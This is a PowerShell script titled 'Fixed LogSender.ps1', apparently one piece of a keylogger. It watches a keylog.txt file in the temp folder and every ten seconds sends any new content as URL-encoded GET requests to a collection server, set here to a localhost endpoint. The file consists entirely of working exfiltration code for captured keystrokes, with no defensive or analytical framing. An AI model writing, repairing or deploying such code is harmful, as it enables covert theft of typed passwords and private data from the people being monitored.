# Fixed LogSender.ps1
$logFile = "$env:temp\keylog.txt"
$serverBaseUrl = "http://localhost:5000/receive_text"
$lastContent = ""
$firstRun = $true

function Send-LogContent {
    param (
        [string]$content
    )
    
    if (-not [string]::IsNullOrEmpty($content)) {
        try {
            # Trim the content to reasonable length and clean it
            $cleanContent = $content.Trim() -replace "[^\p{L}\p{N}\p{P}\p{S}\s]", ""
            
            # Build URI safely
            $uriBuilder = New-Object System.UriBuilder $serverBaseUrl
            $uriBuilder.Query = "text=$([System.Uri]::EscapeDataString($cleanContent))"
            $fullUrl = $uriBuilder.ToString()
            
            # Send GET request with timeout
            $response = Invoke-RestMethod -Uri $fullUrl -Method Get -TimeoutSec 5
            
            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Logs sent successfully ($($cleanContent.Length) chars)"
            return $true
        }
        catch {
            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Error sending logs: $($_.Exception.Message)" -ForegroundColor Red
            return $false
        }
    }
}

Write-Host "Starting log sender. Press Ctrl+C to stop."
Write-Host "Monitoring file: $logFile"
Write-Host "Sending to: $serverBaseUrl"

# Main loop
while ($true) {
    if (Test-Path $logFile) {
        try {
            $currentContent = Get-Content $logFile -Raw -ErrorAction Stop
            
            # Only send if content has changed or it's the first run
            if ($currentContent -ne $lastContent -or $firstRun) {
                $firstRun = $false
                
                if (Send-LogContent -content $currentContent) {
                    $lastContent = $currentContent
                }
            }
        }
        catch {
            Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Error reading log file: $_" -ForegroundColor Yellow
        }
    }
    else {
        Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Log file not found. Waiting..." -ForegroundColor DarkGray
    }
    
    # Wait 10 seconds before checking again
    Start-Sleep -Seconds 10
}